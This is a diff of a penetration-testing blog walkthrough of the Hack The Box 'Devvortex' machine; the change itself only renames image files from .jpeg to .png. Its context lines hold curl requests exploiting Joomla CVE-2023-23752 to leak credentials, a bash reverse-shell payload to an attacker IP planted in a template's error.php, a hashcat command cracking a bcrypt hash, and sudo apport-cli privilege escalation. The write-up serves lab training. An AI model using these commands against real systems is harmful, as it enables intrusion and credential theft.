@@ -100,7 +100,7 @@ gobuster dir -u http://dev.devvortex.htb -w /usr/share/seclists/Discovery/Web-Co
 
 The **/administrator** directory found looks very promising. When I browse to the URL via the browser, I see a login page to the backend administration panel and confirm the site is running the Joomla! CMS.
 
-![Joomla CMS administration page login](/Pen-testing-blog/assets/images/1__BgSpGBRMW4__sNUFOjcsi8A.jpeg "Figure 7 - Joomla CMS administration page login")
+![Joomla CMS administration page login](/Pen-testing-blog/assets/images/1__BgSpGBRMW4__sNUFOjcsi8A.png "Figure 7 - Joomla CMS administration page login")
 
 As I know the site is running Joomla!, I use the [Joomscan Perl script](https://github.com/OWASP/joomscan) to obtain the version of Joomla! running. First, I clone the Github repo locally to my Kali Linux machine and then run the Perl script **Joomscan.pl** within the Joomscan directory. The results show that Joomla! version 4.2.6 is in use.
 
@@ -110,7 +110,7 @@ cd joomscan
 perl joomscan.pl
 ```
 
-![Joomla scan output](/Pen-testing-blog/assets/images/1__6Wwbv4qVqttYaNFpaBnPfQ.jpeg "Figure 8 - Joomscan output")
+![Joomla scan output](/Pen-testing-blog/assets/images/1__6Wwbv4qVqttYaNFpaBnPfQ.png "Figure 8 - Joomscan output")
 
 ## Step 2 - Obtaining initial foothold as user www-data
 
@@ -120,11 +120,11 @@ Now that I know what version of Joomla! is running on the web server, I need to 
 
 When I search the Exploit-DB, I found that Joomla versions 4.00–4.2.7 is vulnerable to the unauthenticated information disclosure vulnerability [**CVE-2023–23752**](https://www.exploit-db.com/exploits/51334). As a result of broken access control, an unauthenticated user can make API calls to two Joomla installation endpoints that return user IDs and backend database credentials respectively.
 
-![CVE-2023-23752 vulnerability details](/Pen-testing-blog/assets/images/1__YfEsyFHby1gNlTmTrLfgDQ.jpeg "Figure 9 - CVE2023-23752 vulnerability details")
+![CVE-2023-23752 vulnerability details](/Pen-testing-blog/assets/images/1__YfEsyFHby1gNlTmTrLfgDQ.png "Figure 9 - CVE2023-23752 vulnerability details")
 
-![Vulnerable code returning user IDs](/Pen-testing-blog/assets/images/1__puoUJF2NOo7mH__byICX16w.jpeg "Figure 10 - Vulnerable code returning user IDs")
+![Vulnerable code returning user IDs](/Pen-testing-blog/assets/images/1__puoUJF2NOo7mH__byICX16w.png "Figure 10 - Vulnerable code returning user IDs")
 
-![code returning DB passwords](/Pen-testing-blog/assets/images/1__YK4MUVD__Y29EzD9sPhPLSQ.jpeg "Figure 11 - Vulnerable code returning DB passwords")
+![code returning DB passwords](/Pen-testing-blog/assets/images/1__YK4MUVD__Y29EzD9sPhPLSQ.png "Figure 11 - Vulnerable code returning DB passwords")
 
 I exploit this vulnerability by issuing two requests to the vulnerable API endpoints via the cURL command, with the first to obtain the users’ login IDs and the second, the users’ backend database passwords. Both outputs were sent as the input to **jq** command to print results in JSON form for readability.
 
@@ -134,9 +134,9 @@ curl http://dev.devvortex.htb/api/index.php/v1/users?public=true | jq
 curl http://dev.devvortex.htb/api/index.php/v1/config/application?public=true| jq
 ```
 
-![Exploit of CVE-2023-23752 successful - user IDs](/Pen-testing-blog/assets/images/1__Tha8rbei865gXmhHZYyazA.jpeg "Figure 12 - Exploit of CVE-2023-23752 successful - returned user IDs")
+![Exploit of CVE-2023-23752 successful - user IDs](/Pen-testing-blog/assets/images/1__Tha8rbei865gXmhHZYyazA.png "Figure 12 - Exploit of CVE-2023-23752 successful - returned user IDs")
 
-![Exploit of CVE-2023-23752 successful - user IDs](/Pen-testing-blog/assets/images/1__Tha8rbei865gXmhHZYyazA.jpeg "Figure 13 - Exploit of CVE-2023-23752 successful - returned user IDs")
+![Exploit of CVE-2023-23752 successful - user IDs](/Pen-testing-blog/assets/images/1__Tha8rbei865gXmhHZYyazA.png "Figure 13 - Exploit of CVE-2023-23752 successful - returned user IDs")
 
 The exploit was successful and revealed two users — lewis and logan with lewis having elevated access privileges as a super user along with the plaintext password for lewis.
 
@@ -144,7 +144,7 @@ The exploit was successful and revealed two users — lewis and logan with l
 
 I used the new credentials to attempt to login into the Jooma! administrator interface as Lewis and was successful.
 
-![Successful login to Joomla administration interface](/Pen-testing-blog/assets/images/1__UxH7PAtkPYwl5GJX9tW1wQ.jpeg "Figure 14 - Successful login to Joomla! administration page")
+![Successful login to Joomla administration interface](/Pen-testing-blog/assets/images/1__UxH7PAtkPYwl5GJX9tW1wQ.png "Figure 14 - Successful login to Joomla! administration page")
 
 ### Establishing reverse shell connection via template modification
 
@@ -152,7 +152,7 @@ After logging into the administrative page, I create a reverse shell connection 
 
 I use the template **Cassiopeia** and edit the **error.php** script at **<http://dev.devvortex.htb/templates/cassiopeia/error.php>** I use the global variable, **$\_REQUEST**, to pass in the parameter, cmd, that takes a value which the web server will parse as a command for execution. Here, the value passed to the cmd parameter is the command to create a reverse shell via bash script using -i flag for interactive mode.
 
-![Command to create a reverse shell to my machine](/Pen-testing-blog/assets/images/1__LX2qdQ74EdYNCy1Z5oPo3Q.jpeg "Figure 15 - Injection of malicious reverse shell payload into PHP script")
+![Command to create a reverse shell to my machine](/Pen-testing-blog/assets/images/1__LX2qdQ74EdYNCy1Z5oPo3Q.png "Figure 15 - Injection of malicious reverse shell payload into PHP script")
 
 ```bash
 cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.36/4444 0>%261"
@@ -160,9 +160,9 @@ cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.36/4444 0>%261"
 
 In my Kali Linux terminal, I set up my net cat listener to listen for connections on port 4444 to match the reverse shell one line command configuration (although any open port can be used). Upon visiting **error.php** page at the above URL and passing in the malicious command above as the cmd parameter value, I successfully catch a reverse shell in net cat. To make the shell more interactive and enhance its functionality, I stabilize it by using Python pty module to give me a pseudo-TTY after which I generate a bash shell on top of the reverse shell connection.
 
-![Execution of malicious payload in browser](/Pen-testing-blog/assets/images/1__pWU8JJWNCbokOagLmu7JVg.jpeg "Figure 16 - Execution of malicious reverse shell payload in the browser")
+![Execution of malicious payload in browser](/Pen-testing-blog/assets/images/1__pWU8JJWNCbokOagLmu7JVg.png "Figure 16 - Execution of malicious reverse shell payload in the browser")
 
-![Successful reverse shell connection from victim computer](/Pen-testing-blog/assets/images/1__9wGk60t7Rwsk0HLBkwCwGw.jpeg "Figure 17 - Successful reverse shell connection from victim computer to my Kali Linux machine")
+![Successful reverse shell connection from victim computer](/Pen-testing-blog/assets/images/1__9wGk60t7Rwsk0HLBkwCwGw.png "Figure 17 - Successful reverse shell connection from victim computer to my Kali Linux machine")
 
 ## Step 3 — Lateral movement — www-data -> Logan
 
@@ -176,11 +176,11 @@ I try to use the credentials of the user **lewis** to login to backend MySQL DB 
 mysql -u lewis -p
 ```
 
-![Successful login to MySQL DB as user lewis](/Pen-testing-blog/assets/images/1__IouCSc3sJ__aZdWFFGQ__Uhg.jpeg "Figure 18 - Successful login to SQL DB as user lewis")
+![Successful login to MySQL DB as user lewis](/Pen-testing-blog/assets/images/1__IouCSc3sJ__aZdWFFGQ__Uhg.png "Figure 18 - Successful login to SQL DB as user lewis")
 
 I enumerate the only non-default database present, Joomla, along with all its tables. The table **sd4fg_users** seemed interesting. I further enumerate this table via the MySQL command **describe table** (or describe or desc) to see what fields are present. The fields **name, username, and password** immediately stand out.
 
-![Database table _users enumeration results](/Pen-testing-blog/assets/images/1__uMsFpI5cmwmrXdLFb3cC6Q.jpeg "Figure 19 - DB table sd4fg_users schema")
+![Database table _users enumeration results](/Pen-testing-blog/assets/images/1__uMsFpI5cmwmrXdLFb3cC6Q.png "Figure 19 - DB table sd4fg_users schema")
 
 After running a simple SELECT command on the aformentioned three fields, I obtain the password hash of the user **logan**.
 
@@ -188,7 +188,7 @@ After running a simple SELECT command on the aformentioned three fields, I obtai
 SELECT name, username , password FROM sd4fg\_users;
 ```
 
-![](/Pen-testing-blog/assets/images/1__TF0NYbYCpXaFLt__wdsBkTw.jpeg)
+![](/Pen-testing-blog/assets/images/1__TF0NYbYCpXaFLt__wdsBkTw.png)
 
 ### Cracking the password hash of user logan using hashcat
 
@@ -202,8 +202,8 @@ Using hashcat in dictionary or straight attack mode with a hash format of bcrypt
 
 hashcat -a 0 -m 3200 '$2y$10$IT4k5kmSGvHS09d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12' /usr/share/wordlists/rockyou.txt -o crackedhashes.txt
 
-![](/Pen-testing-blog/assets/images/1__i1JHgis1EWShiS7y9fFy8g.jpeg)
-![](/Pen-testing-blog/assets/images/1__dIZPuSSCmKwNeYLky__N6IA.jpeg)
+![](/Pen-testing-blog/assets/images/1__i1JHgis1EWShiS7y9fFy8g.png)
+![](/Pen-testing-blog/assets/images/1__dIZPuSSCmKwNeYLky__N6IA.png)
 
 ### Logging in as user logan via secure shell — SSH
 
@@ -211,13 +211,13 @@ The initial enumeration via nmap revealed a SSH server running on port 22. Now I
 
 ssh <logan@devvortex.htb> -p 22
 
-![](/Pen-testing-blog/assets/images/1__WjgIdhqOrvTHpriNExrl1w.jpeg)
+![](/Pen-testing-blog/assets/images/1__WjgIdhqOrvTHpriNExrl1w.png)
 
 ## Step 4 — Privilege escalation — Logan -> Root
 
 I first find out what commands the user logan can run as the root user via sudo command. The user logan is able to run **usr/bin/apport-cli** used to report application bugs to developers and the version of apport-cli running is **2.20.11** which is susceptible to privileged escalation vulnerability [**CVE-2023–1326**](https://nvd.nist.gov/vuln/detail/CVE-2023-1326) due to the default pager of **less** being chosen when apport-cli is run as root user via sudo and that less allows running of commands via pre-pending via !.
 
-![](/Pen-testing-blog/assets/images/1__HgZoXvkyEN__MPoBwOIEWkw.jpeg)
+![](/Pen-testing-blog/assets/images/1__HgZoXvkyEN__MPoBwOIEWkw.png)
 
 ### Exploitation of CVE-2023–1326 via fictious bug report creation
 
@@ -225,5 +225,5 @@ To create a bug report , I run apport-cli with the -f or — file-bug flag 
 
 sudo usr/bin/apport-cli --file-bug
 
-![](/Pen-testing-blog/assets/images/1__B9P0w0490bP0eQAmE4rEXw.jpeg)
-![](/Pen-testing-blog/assets/images/1__9VSZFXgS1txlyzC9N6THNQ.jpeg)
+![](/Pen-testing-blog/assets/images/1__B9P0w0490bP0eQAmE4rEXw.png)
+![](/Pen-testing-blog/assets/images/1__9VSZFXgS1txlyzC9N6THNQ.png)
